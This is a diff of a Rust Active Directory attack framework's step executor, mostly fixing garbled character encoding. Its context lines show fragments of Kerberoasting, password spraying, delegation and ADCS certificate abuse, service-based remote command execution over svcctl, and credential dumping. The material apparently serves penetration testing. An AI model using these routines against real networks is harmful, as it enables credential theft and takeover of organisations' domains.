@@ -1,4 +1,4 @@
-//! Step executor â€” Takes a single PlanStep and executes it against
+//! Step executor — Takes a single PlanStep and executes it against
 //! the target environment using the appropriate overthrone crate.
 //!
 //! The executor translates PlannedActions into actual API calls to
@@ -23,9 +23,9 @@ use overthrone_hunter::userenum::{self, UserEnumConfig};
 use std::collections::{HashMap, HashSet};
 use std::path::PathBuf;
 use tracing::{debug, info, warn};
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-// Execution Context â€” holds auth and connection info
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
+// Execution Context — holds auth and connection info
+// ═══════════════════════════════════════════════════════════
 
 /// Everything the executor needs to run actions
 #[derive(Debug, Clone)]
@@ -103,9 +103,9 @@ impl ExecContext {
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Main Dispatch
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 /// Execute a plan step, updating the engagement state with results
 pub async fn execute_step(
@@ -116,7 +116,7 @@ pub async fn execute_step(
     info!("{} {}", "â–¶".cyan(), step.description.bold());
 
     if ctx.dry_run {
-        info!("{}", "  DRY RUN â€” skipping execution".dimmed());
+        info!("{}", "  DRY RUN — skipping execution".dimmed());
         state.log_action(
             &step.stage.to_string(),
             &step.description,
@@ -156,7 +156,7 @@ pub async fn execute_step(
             | PlannedAction::AdcsEsc13 { .. }
     );
     if requires_ldap && !ctx.ldap_available {
-        let msg = format!("Skipped: LDAP service unavailable â€” {}", step.description);
+        let msg = format!("Skipped: LDAP service unavailable — {}", step.description);
         warn!("{}", msg);
         state.log_action(&step.stage.to_string(), &step.description, "", false, &msg);
         return StepResult {
@@ -470,7 +470,7 @@ async fn cleanup_local_artifacts(
             match tokio::fs::remove_file(path).await {
                 Ok(()) => {
                     removed_paths += 1;
-                    info!("  {} Removed {}", "âœ“".green(), path.dimmed());
+                    info!("  {} Removed {}", "✓".green(), path.dimmed());
                 }
                 Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
                     debug!("Rollback file already absent: {}", path);
@@ -538,7 +538,7 @@ async fn compensate_rbcd(
             Err(e) => {
                 return StepResult {
                     success: false,
-                    output: format!("RBCD compensation â€” SID lookup failed: {e}"),
+                    output: format!("RBCD compensation — SID lookup failed: {e}"),
                     new_credentials: 0,
                     new_admin_hosts: 0,
                 };
@@ -555,9 +555,7 @@ async fn compensate_rbcd(
             None => {
                 return StepResult {
                     success: false,
-                    output: format!(
-                        "RBCD compensation â€” could not resolve SID for '{controlled}'"
-                    ),
+                    output: format!("RBCD compensation — could not resolve SID for '{controlled}'"),
                     new_credentials: 0,
                     new_admin_hosts: 0,
                 };
@@ -581,14 +579,14 @@ async fn compensate_rbcd(
     match overthrone_hunter::rbcd::run(&hunt_config, &rc).await {
         Ok(r) if r.success => {
             info!(
-                "  {} RBCD compensation succeeded for {} â†’ {}",
-                "âœ“".green(),
+                "  {} RBCD compensation succeeded for {} → {}",
+                "✓".green(),
                 controlled.bold(),
                 target.red()
             );
             StepResult {
                 success: true,
-                output: format!("Removed RBCD: {controlled} â†’ {target}"),
+                output: format!("Removed RBCD: {controlled} → {target}"),
                 new_credentials: 0,
                 new_admin_hosts: 0,
             }
@@ -646,7 +644,7 @@ async fn compensate_restore_template(
         .await
     {
         Ok(_) => {
-            info!("  {} Restored template {template}", "âœ“".green());
+            info!("  {} Restored template {template}", "✓".green());
             let _ = conn.disconnect().await;
             StepResult {
                 success: true,
@@ -667,13 +665,13 @@ async fn compensate_restore_template(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // LDAP Connection Helper
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 /// Connect to LDAP using the effective credentials from the ExecContext.
 /// When `use_hash` is true (pass-the-hash mode), LDAP simple bind cannot
-/// work â€” the password field holds an NT hash, not a cleartext password.
+/// work — the password field holds an NT hash, not a cleartext password.
 /// In that case we check for a known cleartext among cracked credentials
 /// or return a clear error instead of sending garbage to the DC.
 async fn ldap_connect(
@@ -751,9 +749,9 @@ async fn ldap_connect(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // SMB Connection Helper (pass-the-hash aware)
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 /// Connect to a target via SMB, correctly handling pass-the-hash mode.
 /// When `use_hash` is true, calls `SmbSession::connect_with_hash()` instead
@@ -1045,9 +1043,9 @@ fn password_fits_policy(state: &EngagementState, candidate: &str) -> bool {
     true
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Enumeration Executors
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
     let mut conn = match ldap_connect(ctx, state).await {
@@ -1120,7 +1118,7 @@ async fn exec_enumerate_users(ctx: &ExecContext, state: &mut EngagementState) ->
         state.asrep_roastable.len(),
         lockout_risk
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1177,9 +1175,9 @@ async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState
         });
     }
 
-    // â”€â”€ RBCD target discovery â”€â”€
+    // ── RBCD target discovery ──
     // Try to find computers where we may have GenericWrite (RBCD pre-requisite).
-    // Heuristic 1: Computers we created (mS-DS-CreatorSID set â†’ we have full control)
+    // Heuristic 1: Computers we created (mS-DS-CreatorSID set → we have full control)
     // Heuristic 2: Computers with existing msDS-AllowedToActOnBehalfOfOtherIdentity
     if let Ok(mut rbcd_conn) = ldap_connect(ctx, state).await {
         let filter = "(&(objectClass=computer)(mS-DS-CreatorSID=*))";
@@ -1227,7 +1225,7 @@ async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState
         if !state.rbcd_targets.is_empty() {
             info!(
                 "  {} {} RBCD-writable computer(s) identified",
-                "âš ".yellow(),
+                "⚠".yellow(),
                 state.rbcd_targets.len()
             );
         }
@@ -1239,7 +1237,7 @@ async fn exec_enumerate_computers(ctx: &ExecContext, state: &mut EngagementState
         dc_count,
         state.unconstrained_delegation.len()
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1275,7 +1273,7 @@ async fn exec_enumerate_groups(ctx: &ExecContext, state: &mut EngagementState) -
     }
 
     let msg = format!("Enumerated {} groups", state.groups.len());
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1326,7 +1324,7 @@ async fn exec_enumerate_trusts(ctx: &ExecContext, state: &mut EngagementState) -
         trusts.len(),
         trust_info.join(", ")
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1402,7 +1400,7 @@ async fn exec_enumerate_gpos(ctx: &ExecContext, state: &mut EngagementState) -> 
         entries.len(),
         gpo_names.join(", ")
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1492,7 +1490,7 @@ async fn exec_enumerate_password_policy(
         policy.lockout_observation_window,
         policy.fine_grained_policy_count
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1567,7 +1565,7 @@ async fn exec_enumerate_delegations(ctx: &ExecContext, state: &mut EngagementSta
         state.unconstrained_delegation.len(),
         state.rbcd_targets.len()
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1664,7 +1662,7 @@ async fn exec_enumerate_laps(ctx: &ExecContext, state: &mut EngagementState) -> 
         state.readable_laps_count(),
         new_creds
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -1694,7 +1692,7 @@ async fn exec_enumerate_shares(
                 readable.len(),
                 readable
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: true,
                 output: msg,
@@ -1727,7 +1725,7 @@ async fn exec_check_admin(
                         mark_credential_admin(state, attempt, target);
                         info!(
                             "  {} Admin on {} via {}\\{} ({})",
-                            "âœ“".green(),
+                            "✓".green(),
                             target.bold(),
                             attempt.domain,
                             attempt.username,
@@ -1736,14 +1734,14 @@ async fn exec_check_admin(
                         break;
                     } else {
                         debug!(
-                            "  âœ— {} â€” auth ok but no admin via {}\\{}",
+                            "  ✗ {} — auth ok but no admin via {}\\{}",
                             target, attempt.domain, attempt.username
                         );
                     }
                 }
                 Err(e) => {
                     debug!(
-                        "  âœ— {} â€” {}\\{} ({}) â€” {}",
+                        "  ✗ {} — {}\\{} ({}) — {}",
                         target, attempt.domain, attempt.username, attempt.source, e.output
                     );
                 }
@@ -1798,7 +1796,7 @@ async fn exec_user_enum(
                 new_users,
                 res.no_preauth_users.len()
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: true,
                 output: msg,
@@ -1867,7 +1865,7 @@ async fn exec_rid_cycle(
                 users_found,
                 new_users
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: true,
                 output: msg,
@@ -1897,9 +1895,9 @@ fn mark_credential_admin(state: &mut EngagementState, attempt: &SmbAttempt, targ
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Kerberos Attack Executors
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_kerberoast(
     ctx: &ExecContext,
@@ -1954,7 +1952,7 @@ async fn exec_kerberoast(
         let account_spns = match state.spn_map.get(account) {
             Some(s) if !s.is_empty() => s.clone(),
             _ => {
-                // No SPNs discovered â€” if we are in fallback mode, try the account name itself
+                // No SPNs discovered — if we are in fallback mode, try the account name itself
                 vec![account.clone()]
             }
         };
@@ -1964,7 +1962,7 @@ async fn exec_kerberoast(
                 Ok(hash) => {
                     info!(
                         "  {} Kerberoast hash: {} ({})",
-                        "âœ“".green(),
+                        "✓".green(),
                         account.bold(),
                         spn
                     );
@@ -1975,7 +1973,7 @@ async fn exec_kerberoast(
                 Err(e) => {
                     let error_text = e.to_string();
                     *error_counts.entry(error_text.clone()).or_insert(0) += 1;
-                    debug!("{} {} {} {}", "  âœ—".dimmed(), account, spn, e);
+                    debug!("{} {} {} {}", "  ✗".dimmed(), account, spn, e);
                 }
             }
         }
@@ -2002,7 +2000,7 @@ async fn exec_kerberoast(
             }
             info!(
                 "  {} Wrote {} hashes to {}",
-                "â†’".cyan(),
+                "→".cyan(),
                 hash_count,
                 hash_file.display()
             );
@@ -2029,12 +2027,7 @@ async fn exec_kerberoast(
 
     info!(
         "{} {}",
-        if hash_count > 0 {
-            "  âœ“"
-        } else {
-            "  âœ—"
-        }
-        .yellow(),
+        if hash_count > 0 { "  ✓" } else { "  ✗" }.yellow(),
         msg
     );
     StepResult {
@@ -2181,7 +2174,7 @@ async fn exec_asrep_roast(
     for user in &targets {
         match kerberos::asrep_roast(&ctx.dc_ip, &ctx.domain, user).await {
             Ok(hash) => {
-                info!("  {} AS-REP hash: {}", "âœ“".green(), user.bold());
+                info!("  {} AS-REP hash: {}", "✓".green(), user.bold());
                 state.roast_hashes.push(hash.hash_string.clone());
                 hash_count += 1;
             }
@@ -2214,12 +2207,7 @@ async fn exec_asrep_roast(
 
     info!(
         "{} {}",
-        if hash_count > 0 {
-            "  âœ“"
-        } else {
-            "  âœ—"
-        }
-        .yellow(),
+        if hash_count > 0 { "  ✓" } else { "  ✗" }.yellow(),
         msg
     );
     StepResult {
@@ -2230,9 +2218,9 @@ async fn exec_asrep_roast(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Delegation Attack Executors (wired to overthrone-hunter)
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_constrained_delegation(
     ctx: &ExecContext,
@@ -2271,14 +2259,14 @@ async fn exec_constrained_delegation(
             // If S4U succeeded, we effectively have admin on the target service
             for chain in &result.s4u_chains {
                 if chain.success {
-                    // Extract hostname from SPN (e.g., "cifs/dc01.corp.local" â†’ "dc01.corp.local")
+                    // Extract hostname from SPN (e.g., "cifs/dc01.corp.local" → "dc01.corp.local")
                     if let Some(host) = chain.target_spn.split('/').nth(1) {
                         let host: &str = host;
                         state.admin_hosts.insert(host.to_string());
                     }
                     info!(
-                        "  {} S4U chain: {} â†’ {} as {}",
-                        "âœ“".green(),
+                        "  {} S4U chain: {} → {} as {}",
+                        "✓".green(),
                         chain.source_account.bold(),
                         chain.target_spn.cyan(),
                         chain.impersonated_user.red()
@@ -2292,7 +2280,7 @@ async fn exec_constrained_delegation(
                 result.s4u_chains.len(),
                 result.delegatable_accounts.len()
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: successful > 0,
                 output: msg,
@@ -2356,7 +2344,7 @@ async fn exec_rbcd(
                 return StepResult {
                     success: false,
                     output: format!(
-                        "Could not resolve objectSid for '{}' via LDAP â€” RBCD requires a valid SID",
+                        "Could not resolve objectSid for '{}' via LDAP — RBCD requires a valid SID",
                         controlled
                     ),
                     new_credentials: 0,
@@ -2385,8 +2373,8 @@ async fn exec_rbcd(
                 state.admin_hosts.insert(target.to_string());
                 new_admin = 1;
                 info!(
-                    "  {} RBCD: {} â†’ {} (impersonating Administrator)",
-                    "âœ“".green(),
+                    "  {} RBCD: {} → {} (impersonating Administrator)",
+                    "✓".green(),
                     controlled.bold(),
                     target.red()
                 );
@@ -2399,9 +2387,9 @@ async fn exec_rbcd(
             info!(
                 "{} {}",
                 if result.success {
-                    "  âœ“".green()
+                    "  ✓".green()
                 } else {
-                    "  âœ—".red()
+                    "  ✗".red()
                 },
                 msg
             );
@@ -2463,7 +2451,7 @@ async fn exec_unconstrained_delegation(
                 reachable,
                 result.domain_controllers.len()
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: !result.vulnerable_hosts.is_empty(),
                 output: msg,
@@ -2480,9 +2468,9 @@ async fn exec_unconstrained_delegation(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Coercion Executor (wired to overthrone-hunter)
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_coerce(
     ctx: &ExecContext,
@@ -2510,13 +2498,13 @@ async fn exec_coerce(
             for coercion in &result.successful_coercions {
                 info!(
                     "  {} Coercion triggered: {} via {}",
-                    "âœ“".green(),
+                    "✓".green(),
                     target.bold(),
                     coercion.method.cyan()
                 );
             }
             let msg = format!("Coercion: {} trigger(s) succeeded", success_count);
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: success_count > 0,
                 output: msg,
@@ -2533,11 +2521,11 @@ async fn exec_coerce(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Password Spray
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
-// â”€â”€ ADCS Executor Functions â”€â”€
+// ── ADCS Executor Functions ──
 
 async fn exec_adcs_enumerate(ctx: &ExecContext, state: &mut EngagementState) -> StepResult {
     let conn = match ldap_connect(ctx, state).await {
@@ -2573,7 +2561,7 @@ async fn exec_adcs_enumerate(ctx: &ExecContext, state: &mut EngagementState) -> 
         if let Some(esc_num) = t.esc_vulnerability() {
             info!(
                 "  {} ESC{}: {} ({})",
-                "âš ".yellow(),
+                "⚠".yellow(),
                 esc_num,
                 t.name.bold(),
                 t.display_name
@@ -2593,7 +2581,7 @@ async fn exec_adcs_enumerate(ctx: &ExecContext, state: &mut EngagementState) -> 
             .collect::<Vec<_>>()
             .join(", ")
     );
-    info!("{} {}", "  âœ“".green(), msg);
+    info!("{} {}", "  ✓".green(), msg);
     StepResult {
         success: true,
         output: msg,
@@ -2640,7 +2628,7 @@ async fn exec_adcs_esc1(
         Ok(cert) => {
             info!(
                 "  {} ESC1 cert issued: {} (thumbprint: {})",
-                "âœ“".green(),
+                "✓".green(),
                 cert.template.bold(),
                 cert.thumbprint.cyan()
             );
@@ -2743,7 +2731,7 @@ async fn exec_adcs_esc4(
         Ok(()) => {
             info!(
                 "  {} ESC4: Template {} modified for ESC1 exploitation",
-                "âœ“".green(),
+                "✓".green(),
                 real_template.bold()
             );
 
@@ -2754,7 +2742,7 @@ async fn exec_adcs_esc4(
             if let Err(e) = target.restore(&mut conn, None).await {
                 warn!("ESC4 template restore failed: {e}");
             } else {
-                info!("  {} Template {} restored", "âœ“".green(), real_template);
+                info!("  {} Template {} restored", "✓".green(), real_template);
             }
 
             let _ = conn.disconnect().await;
@@ -2811,7 +2799,7 @@ async fn exec_adcs_esc6(
         Ok(true) => {
             info!(
                 "  {} CA {} has EDITF_ATTRIBUTESUBJECTALTNAME2",
-                "âš ".yellow(),
+                "⚠".yellow(),
                 ca_server
             );
         }
@@ -2861,7 +2849,7 @@ async fn exec_adcs_esc6(
                 real_upn,
                 cert.pfx_data.len()
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: true,
                 output: msg,
@@ -3360,7 +3348,7 @@ async fn resolve_adcs_params(
     Ok((real_template, real_ca, real_upn))
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_password_spray(
     ctx: &ExecContext,
@@ -3415,8 +3403,8 @@ async fn exec_password_spray(
     for user in &target_users {
         match kerberos::request_tgt(&ctx.dc_ip, &ctx.domain, user, &password, false).await {
             Ok(_) => {
-                info!("  {} VALID: {}:[REDACTED]", "âœ“".green(), user.bold());
-                debug!("  {} VALID: {}:{}", "âœ“".green(), user.bold(), password);
+                info!("  {} VALID: {}:[REDACTED]", "✓".green(), user.bold());
+                debug!("  {} VALID: {}:{}", "✓".green(), user.bold(), password);
                 state.add_credential(CompromisedCred {
                     username: user.clone(),
                     secret: password.clone(),
@@ -3428,7 +3416,7 @@ async fn exec_password_spray(
                 success_count += 1;
             }
             Err(_) => {
-                debug!("{} {}:{}", "  âœ—".dimmed(), user, password);
+                debug!("{} {}:{}", "  ✗".dimmed(), user, password);
             }
         }
         ctx.jitter().await;
@@ -3448,9 +3436,9 @@ async fn exec_password_spray(
     }
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Remote Execution (svcctl via SMB named pipe)
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_smbexec(
     ctx: &ExecContext,
@@ -3494,7 +3482,7 @@ async fn exec_generic(
     exec_remote(ctx, state, target, cmd, method).await
 }
 
-/// Unified remote execution handler â€” creates & starts a service via svcctl pipe
+/// Unified remote execution handler — creates & starts a service via svcctl pipe
 async fn exec_remote(
     ctx: &ExecContext,
     state: &mut EngagementState,
@@ -3503,7 +3491,7 @@ async fn exec_remote(
     method: &str,
 ) -> StepResult {
     info!(
-        "  {} â†’ {} via {}",
+        "  {} → {} via {}",
         target.bold(),
         command.yellow(),
         method.cyan()
@@ -3556,13 +3544,12 @@ async fn exec_remote(
                         );
                     }
                     Err(_) => {
-                        output =
-                            "(output not captured â€” command may still be running)".to_string();
+                        output = "(output not captured — command may still be running)".to_string();
                     }
                 }
             }
 
-            // Cleanup â€” delete service & output file
+            // Cleanup — delete service & output file
             let _ = delete_service(&smb, &svc_name).await;
             let _ = smb.delete_file("ADMIN$", &share_path).await;
 
@@ -3573,7 +3560,7 @@ async fn exec_remote(
                 method,
                 output.len()
             );
-            info!("{} {}", "  âœ“".green(), msg);
+            info!("{} {}", "  ✓".green(), msg);
             StepResult {
                 success: true,
                 output,
@@ -3594,7 +3581,7 @@ async fn exec_remote(
 async fn create_and_start_service(smb: &SmbSession, name: &str, bin_path: &str) -> Result<()> {
     info!(
         "{}",
-        format!("  Creating service {name} â†’ {bin_path}").dimmed()
+        format!("  Creating service {name} → {bin_path}").dimmed()
     );
 
     // Step 1: RPC Bind to SVCCTL
@@ -3631,7 +3618,7 @@ async fn create_and_start_service(smb: &SmbSession, name: &str, bin_path: &str) 
     let _ = smb.pipe_transact("svcctl", &start_req).await;
     // StartService may return error 1053 (timeout) which is normal for cmd exec
 
-    // Step 5: DeleteService (opnum 2) â€” cleanup
+    // Step 5: DeleteService (opnum 2) — cleanup
     let delete_req = build_delete_service_request(svc_handle);
     let _ = smb.pipe_transact("svcctl", &delete_req).await;
 
@@ -3674,9 +3661,9 @@ async fn delete_service(smb: &SmbSession, name: &str) -> Result<()> {
     Ok(())
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // SVCCTL NDR Request Builders
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 /// Build RPC bind for SVCCTL interface
 fn build_svcctl_bind() -> Vec<u8> {
@@ -3755,7 +3742,7 @@ fn ndr_conformant_string(s: &str) -> Vec<u8> {
     buf
 }
 
-/// OpenSCManagerW â€” opnum 15
+/// OpenSCManagerW — opnum 15
 fn build_open_scm_request(machine_name: &str) -> Vec<u8> {
     let mut stub = Vec::new();
     stub.extend_from_slice(&ndr_conformant_string(machine_name)); // lpMachineName
@@ -3764,7 +3751,7 @@ fn build_open_scm_request(machine_name: &str) -> Vec<u8> {
     build_rpc_request(15, &stub)
 }
 
-/// CreateServiceW â€” opnum 12
+/// CreateServiceW — opnum 12
 fn build_create_service_request(scm_handle: &[u8], name: &str, bin_path: &str) -> Vec<u8> {
     let mut stub = Vec::new();
     stub.extend_from_slice(scm_handle); // hSCManager (20 bytes)
@@ -3779,13 +3766,13 @@ fn build_create_service_request(scm_handle: &[u8], name: &str, bin_path: &str) -
     stub.extend_from_slice(&0u32.to_le_bytes()); // lpdwTagId (NULL)
     stub.extend_from_slice(&0u32.to_le_bytes()); // lpDependencies (NULL)
     stub.extend_from_slice(&0u32.to_le_bytes()); // cbDependSize
-    stub.extend_from_slice(&0u32.to_le_bytes()); // lpServiceStartName (NULL â€” LocalSystem)
+    stub.extend_from_slice(&0u32.to_le_bytes()); // lpServiceStartName (NULL — LocalSystem)
     stub.extend_from_slice(&0u32.to_le_bytes()); // lpPassword (NULL)
     stub.extend_from_slice(&0u32.to_le_bytes()); // cbPasswordSize
     build_rpc_request(12, &stub)
 }
 
-/// StartServiceW â€” opnum 19
+/// StartServiceW — opnum 19
 fn build_start_service_request(svc_handle: &[u8]) -> Vec<u8> {
     let mut stub = Vec::new();
     stub.extend_from_slice(svc_handle); // hService (20 bytes)
@@ -3794,14 +3781,14 @@ fn build_start_service_request(svc_handle: &[u8]) -> Vec<u8> {
     build_rpc_request(19, &stub)
 }
 
-/// DeleteService â€” opnum 2
+/// DeleteService — opnum 2
 fn build_delete_service_request(svc_handle: &[u8]) -> Vec<u8> {
     let mut stub = Vec::new();
     stub.extend_from_slice(svc_handle);
     build_rpc_request(2, &stub)
 }
 
-/// OpenServiceW â€” opnum 16
+/// OpenServiceW — opnum 16
 fn build_open_service_request(scm_handle: &[u8], name: &str) -> Vec<u8> {
     let mut stub = Vec::new();
     stub.extend_from_slice(scm_handle); // hSCManager
@@ -3810,16 +3797,16 @@ fn build_open_service_request(scm_handle: &[u8], name: &str) -> Vec<u8> {
     build_rpc_request(16, &stub)
 }
 
-/// CloseServiceHandle â€” opnum 0
+/// CloseServiceHandle — opnum 0
 fn build_close_handle_request(handle: &[u8]) -> Vec<u8> {
     let mut stub = Vec::new();
     stub.extend_from_slice(handle);
     build_rpc_request(0, &stub)
 }
 
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 // Credential Dump Executors (remote registry via SMB)
-// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ═══════════════════════════════════════════════════════════
 
 async fn exec_dump_sam(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
     exec_dump(ctx, state, target, "SAM").await
@@ -3843,7 +3830,7 @@ async fn exec_dump_dcc2(
 }
 
 /// Remote credential dump via registry save + SMB download
